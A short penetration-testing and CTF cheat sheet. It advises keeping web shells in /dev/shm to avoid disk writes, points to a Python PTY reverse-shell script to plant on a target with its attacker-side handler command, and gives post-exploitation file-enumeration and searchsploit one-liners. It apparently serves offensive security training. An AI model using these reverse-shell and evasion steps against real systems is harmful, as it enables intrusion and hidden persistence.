## Tips & Tricks

### save web shells in

```
/dev/shm
```

better than /tmp as it writes to memory not disk \(sometimes /dev/shm may restrict suid changes\)

### A good webshell is found here

[https://github.com/infodox/python-pty-shells](https://github.com/infodox/python-pty-shells)

Save [tcp\_pty\_backconnect.py](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py) to the server \(remember to change lhost and lport\)

Use [tcp\_pty\_shell\_handler.py](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_shell_handler.py) from the attacking machine

```
python tcp_pty_shell_handler.py -b LHOST LPORT
```

### Post Exploitation enumeration for CTFs

Gather file information from home directory

```
find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t

f-filename
t-tab delimter
p-path
u-user the owns the fiel
g-group
m-file permissions
n-newline
```

### Searchsploit Details

```
searchsploit -x /php/webapps/IDXXX.php

-x details of exploits (examine the exploit)
-w exploitdb web entry
-p shows full path of exploit and copies to clipboard
```



